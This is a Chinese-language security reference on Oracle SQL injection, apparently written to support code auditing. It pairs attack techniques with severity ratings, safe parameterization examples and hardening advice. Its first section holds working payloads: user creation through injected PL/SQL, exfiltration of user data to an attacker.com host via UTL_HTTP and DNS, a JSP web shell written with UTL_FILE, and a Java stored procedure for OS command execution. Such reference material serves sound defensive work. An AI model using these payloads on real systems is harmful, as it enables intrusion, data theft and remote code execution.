# Oracle Database — 引擎特异性知识

---

## 1. 注入特有技法

### 1.1 PL/SQL 执行（匿名块）

Oracle 支持在 SQL 注入中执行 PL/SQL 匿名块：

```sql
-- 通过匿名块执行任意 PL/SQL
'; BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pass123'; END; --
'; DECLARE rc SYS_REFCURSOR; BEGIN OPEN rc FOR 'SELECT * FROM dba_users'; END; --
```

### 1.2 DBMS_ 包（系统功能调用）

```sql
-- 网络请求（SSRF / 数据外带）
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data=' || (SELECT username FROM dba_users WHERE ROWNUM=1)) FROM DUAL;

-- DNS 外带
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM dba_users WHERE ROWNUM=1) || '.attacker.com') FROM DUAL;

-- 文件读取
DECLARE
  f UTL_FILE.FILE_TYPE;
  s VARCHAR2(200);
BEGIN
  f := UTL_FILE.FOPEN('DATA_DIR', 'secret.txt', 'R');
  UTL_FILE.GET_LINE(f, s);
  UTL_FILE.FCLOSE(f);
END;

-- 文件写入
BEGIN
  UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('DATA_DIR', 'shell.jsp', 'W'), '<% Runtime.getRuntime().exec(request.getParameter("c")); %>');
END;

-- 延时（盲注）
BEGIN DBMS_LOCK.SLEEP(5); END;
-- 或使用
SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM DUAL;
```

### 1.3 DBMS_XMLGEN（数据提取加速）

```sql
-- 一次性提取大量数据（比逐字符盲注高效）
SELECT DBMS_XMLGEN.GETXML('SELECT username, password FROM dba_users') FROM DUAL;
```

### 1.4 Java 存储过程（RCE）

如果 Oracle 安装了 Java 组件（JVM in DB），可以创建 Java 存储过程执行系统命令：

```sql
-- 创建 Java Source
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "cmd" AS
import java.io.*;
public class cmd {
  public static String exec(String cmd) throws Exception {
    return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
  }
};

-- 创建 PL/SQL 包装器
CREATE OR REPLACE FUNCTION os_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'cmd.exec(java.lang.String) return java.lang.String';

-- 执行
SELECT os_cmd('whoami') FROM DUAL;
```

### 1.5 信息收集

```sql
-- 版本信息
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- 当前用户
SELECT user FROM DUAL;
SELECT SYS_CONTEXT('USERENV', 'SESSION_USER') FROM DUAL;

-- 权限
SELECT * FROM session_privs;
SELECT * FROM dba_role_privs WHERE grantee = USER;

-- 所有表
SELECT table_name FROM all_tables WHERE owner = 'SCHEMA_NAME';

-- 列信息
SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'USERS';

-- 所有用户
SELECT username FROM all_users;
SELECT username FROM dba_users;  -- 需要 DBA 权限

-- 密码哈希（老版本）
SELECT username, password FROM dba_users;  -- Oracle 10g 及以前
```

### 1.6 字符串拼接与注释

```sql
-- Oracle 使用 || 拼接字符串（不是 + 也不是 CONCAT 的主要方式）
SELECT 'Hello' || ' ' || 'World' FROM DUAL;

-- Oracle 注释
SELECT * FROM users WHERE name = 'admin' -- comment
SELECT * FROM users WHERE name = 'admin' /* comment */

-- Oracle 不支持 # 注释（与 MySQL 不同）
```

### 1.7 Oracle 特有的盲注技巧

```sql
-- 时间盲注（多种方式）
-- 方法1：DBMS_PIPE
SELECT CASE WHEN (condition) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM DUAL;

-- 方法2：UTL_HTTP（网络延迟）
SELECT CASE WHEN (condition) THEN UTL_HTTP.REQUEST('http://attacker.com/') ELSE NULL END FROM DUAL;

-- 方法3：重计算
SELECT CASE WHEN (condition) THEN (SELECT COUNT(*) FROM all_objects a, all_objects b) ELSE 0 END FROM DUAL;

-- 错误型注入
SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '1' END FROM DUAL;

-- ROWNUM 限制（Oracle 无 LIMIT，用 ROWNUM）
SELECT * FROM (SELECT username, ROWNUM rn FROM dba_users) WHERE rn = 1;
```

---

## 2. 严重性修正因子

| 条件 | 修正 |
|------|------|
| 数据库用户拥有 DBA 角色 | **上调至 🔴 高危 + 标注 RCE 风险** |
| Oracle JVM 已安装且可用 | **上调至 🔴 高危**（Java 存储过程 → RCE） |
| UTL_HTTP / UTL_INADDR 可用 | 标注 SSRF / 数据外带风险 |
| UTL_FILE 可用 + DIRECTORY 对象存在 | 标注文件读写风险 |
| 应用使用 SYS / SYSTEM 账户 | **上调至 🔴 高危**（完全控制数据库） |
| 使用低权限账户且无额外授权 | 维持基础等级 |
| 数据库版本较旧（11g 及以前） | 标注：密码哈希更易破解，更多默认开放功能 |

---

## 3. 数据外带（Out-of-Band）方法

| 方法 | 实现 | 前提条件 |
|------|------|----------|
| HTTP | `UTL_HTTP.REQUEST(url)` | UTL_HTTP 已授权 + 网络可出站 |
| DNS | `UTL_INADDR.GET_HOST_ADDRESS(host)` | DNS 解析可出站 |
| DNS (XXE) | `DBMS_XMLGEN` + 外部实体 | XML 处理可出站 |
| 文件 | `UTL_FILE.FOPEN/PUT_LINE` | DIRECTORY 对象存在 + 写入权限 |
| SMB (Windows) | `UTL_FILE` 到 UNC 路径 | Oracle on Windows |

---

## 4. Oracle 特有占位符与参数化

### 4.1 各语言/驱动的参数化方式

| 语言/驱动 | 占位符 | 示例 |
|---|---|---|
| JDBC (Java) | `?` | `PreparedStatement.setString(1, val)` |
| cx_Oracle (Python) | `:name` 或 `:1` | `cursor.execute("... WHERE name = :name", name=val)` |
| python-oracledb | `:name` 或 `:1` | 同 cx_Oracle |
| node-oracledb | `:name` 或 `:1` | `connection.execute("... WHERE name = :name", {name: val})` |
| ODP.NET (C#) | `:name` | `cmd.Parameters.Add(":name", val)` |
| godror (Go) | `:1` 或 `?` | `db.Query("... WHERE name = :1", val)` |

**注意**：Oracle 使用 `:name` 而非 `@name`（MSSQL）或 `$1`（PostgreSQL），审计时需注意区分。

### 4.2 PL/SQL 动态 SQL

```sql
-- 🔴 危险：EXECUTE IMMEDIATE + 拼接
EXECUTE IMMEDIATE 'SELECT * FROM users WHERE name = ''' || p_name || '''';

-- ✅ 安全：EXECUTE IMMEDIATE + USING 绑定
EXECUTE IMMEDIATE 'SELECT * FROM users WHERE name = :1' USING p_name;

-- 🔴 危险：DBMS_SQL + 拼接
DBMS_SQL.PARSE(cursor_id, 'SELECT * FROM ' || table_name, DBMS_SQL.NATIVE);

-- ✅ 安全：DBMS_SQL + BIND_VARIABLE
DBMS_SQL.PARSE(cursor_id, 'SELECT * FROM users WHERE name = :n', DBMS_SQL.NATIVE);
DBMS_SQL.BIND_VARIABLE(cursor_id, ':n', p_name);
```

---

## 5. 防御建议

1. **最小权限**：应用账户不应拥有 DBA / SYSDBA 角色；仅授予必要表的 CRUD 权限
2. **撤销危险包**：`REVOKE EXECUTE ON UTL_HTTP FROM PUBLIC`；同理 `UTL_FILE`、`UTL_INADDR`、`UTL_SMTP`、`DBMS_LOCK`
3. **禁用 JVM**：如不需要，不安装 Oracle JVM 组件
4. **审计存储过程**：搜索所有 `EXECUTE IMMEDIATE` 和 `DBMS_SQL.PARSE` 中的拼接
5. **网络隔离**：Oracle 服务器不应直接访问外网
6. **使用 `USING` 子句**：所有 `EXECUTE IMMEDIATE` 必须使用 `USING` 绑定参数
